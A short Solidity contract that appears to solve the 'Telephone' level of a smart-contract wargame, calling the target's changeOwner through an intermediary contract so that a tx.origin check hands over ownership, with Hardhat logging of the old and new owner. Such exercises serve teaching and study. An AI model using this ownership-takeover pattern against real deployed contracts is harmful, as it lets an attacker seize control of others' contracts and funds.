// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./_04_Telephone.sol";
import "hardhat/console.sol";

contract TelephoneAttack {
    function TelephoneChangeOwner(address _telephoneAddress) public {
        Telephone telephone = Telephone(_telephoneAddress);
        console.log("CONTRACT LOG: Old owner is %s ", telephone.owner());
        telephone.changeOwner(tx.origin);
        console.log("CONTRACT LOG: New owner is %s ", telephone.owner());
    }
}
